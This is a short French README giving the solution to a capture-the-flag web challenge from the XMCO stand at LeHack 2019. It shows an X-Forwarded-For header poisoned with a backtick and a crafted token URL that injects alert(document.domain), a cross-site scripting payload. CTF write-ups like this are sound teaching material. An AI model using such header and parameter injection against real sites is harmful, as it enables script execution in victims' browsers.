# LH-Challenge

Challenge du stand XMCO à LeHack 2019

## Exploit:

On poison le X-Forwarded-For avec la valeur:

```http
X-Forwarded-For: as=`
```

et on envoie l'URL à notre victime:

```http
http://challenge:4444/?token=`;alert(document.domain)//
```
